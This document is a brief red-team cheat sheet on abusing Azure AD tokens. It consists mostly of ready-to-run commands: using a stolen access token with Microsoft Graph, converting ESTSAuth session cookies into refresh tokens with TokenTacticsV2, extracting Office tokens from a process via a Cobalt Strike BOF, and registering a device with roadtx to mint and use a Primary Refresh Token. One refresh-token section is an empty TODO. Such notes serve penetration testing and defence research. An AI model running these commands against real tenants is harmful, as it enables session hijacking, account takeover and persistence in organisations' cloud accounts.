# Azure AD Tokens


## Access Token

Decode access tokens: [jwt.ms](https://jwt.ms/)

* Use token
    ```ps1
    # use the jwt
    $token = "eyJ0eXAiO..."
    $secure = $token | ConvertTo-SecureString -AsPlainText -Force
    Connect-MgGraph -AccessToken $secure

    # whoami
    Get-MgContext
    Disconnect-MgGraph
    ```


## Refresh Token

* Requesting a token using credentials
    ```ps1
    TODO
    ```
* 


### Get a Refresh Token from ESTSAuth Cookie

`ESTSAuthPersistent` is only useful when a CA policy actually grants a persistent session. Otherwise, you should use `ESTSAuth`.

```ps1
TokenTacticsV2> Get-AzureTokenFromESTSCookie -ESTSAuthCookie "0.AS8"
TokenTacticsV2> Get-AzureTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie "0.AbcAp.."
```


### Get a Refresh Token from Office process

* [trustedsec/CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF)
```ps1
load bofloader
execute_bof /opt/CS-Remote-OPs-BOF/Remote/office_tokens/office_tokens.x64.o --format-string i  7324
```


## Primary Refresh Token

* Use PRT token
    ```ps1
    roadtx browserprtauth -prt roadtx.prt -url http://www.office.com
    ```


### Extract PRT on Device with TPM

* No method known to date.


### Generate a PRT by registering a device

```ps1
roadtx interactiveauth -u user.lastname@domain.local -p password123 -r devicereg
roadtx device -n devicename
roadtx prt -u user.lastname@domain.local -p password123 –-key-pem devicename.key –-cert-pem devicename.pem
roadtx prtenrich –prt roadtx.prt
roadtx prt -u user.lastname@domain.local -p password123 –-key-pem devicename.key –-cert-pem devicename.pem -r 0.AVAApQL<snip>
```


## References

* [Hacking Your Cloud: Tokens Edition 2.0 - Edwin David - April 13, 2023](https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0)
* [Microsoft 365 Developer Program](https://developer.microsoft.com/en-us/microsoft-365/dev-program)